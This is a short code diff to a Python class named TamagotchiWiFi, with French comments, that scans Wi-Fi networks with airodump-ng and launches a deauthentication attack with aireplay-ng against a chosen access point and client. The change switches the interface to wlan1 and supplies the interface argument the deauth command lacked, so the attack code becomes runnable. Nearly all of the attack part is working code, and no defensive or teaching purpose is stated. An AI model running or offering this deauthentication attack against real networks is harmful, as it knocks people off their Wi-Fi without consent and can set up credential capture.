@@ -10,11 +10,11 @@ class TamagotchiWiFi:
 
     def scan_wifi(self):
         print("Scanning Wi-Fi networks...")
-        subprocess.run(["airodump-ng", "--band", "g", "wlan0"])  # Remplacez wlan0 par votre interface
+        subprocess.run(["airodump-ng", "--band", "g", "wlan1"])  # Remplacez wlan0 par votre interface
 
     def attack_wifi(self, bssid, mac):
         print(f"Lancement de l'attaque sur le BSSID {bssid} pour le MAC {mac}...")
-        subprocess.run(["aireplay-ng", "--deauth", "10", "-a", bssid, "-c", mac])
+        subprocess.run(["aireplay-ng", "--deauth", "10", "-a", bssid, "-c", mac, "wlan1"])
 
     def run(self):
         while self.running:
